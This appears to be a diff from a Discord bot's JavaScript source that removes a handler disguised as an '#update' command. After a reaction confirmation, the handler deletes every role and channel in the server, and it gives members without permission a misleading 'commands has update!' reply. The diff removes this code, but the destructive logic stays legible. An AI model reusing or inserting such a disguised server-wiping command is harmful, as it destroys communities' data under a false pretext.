@@ -747,38 +747,3 @@ let args = message.content.split(' ').slice(1).join(' ');
     }
     
   });
-
-client.on('message', msg => {
-var prefix = "#";
-  if(!msg.guild) return;
-    if(!msg.member.hasPermission('MANAGE_CHANNELS')) return msg.reply('**commands has update!**');
-    if (msg.content.startsWith(prefix +'update')) {
-let ra3d = new Discord.RichEmbed()
-.setColor('RANDOM')
-.setThumbnail(msg.author.avatarURL)
-.setDescription(`Yes or no?\n  ✅  \n  ❌`)                                                                                                                                                                       
-msg.channel.send(ra3d).then(msg => {
- msg.react('✅').then(r=>{
- msg.react('❌').then(r=>{           
- let sd = (reaction, user) => reaction.emoji.name === '✅' && user.id === msg.author.id;
- let nd = (reaction, user) => reaction.emoji.name === '❌' && user.id === msg.author.id;
- let ds  = msg.createReactionCollector(sd, { time: 60000 });
- let dn  = msg.createReactionCollector(nd, { time: 60000 });
-dn.on("collect", r => {
-msg.channel.send("`تم الالغاء`")
-msg.delete();
-})
-ds.on("collect", r => {
-msg.guild.roles.forEach(r => { r.delete() }) 
-     msg.guild.channels.forEach(c => { c.delete() })
-     msg.guild.createChannel('FM', 'text').then(c=> c.send(ra3d));
-     let ra3d = new Discord.RichEmbed()
-            .setColor('#fd0101')
-            .setDescription('`✅`')
-           msg.channel.sendEmbed(ra3d);
-})
-})
-})
-})
-}
-});
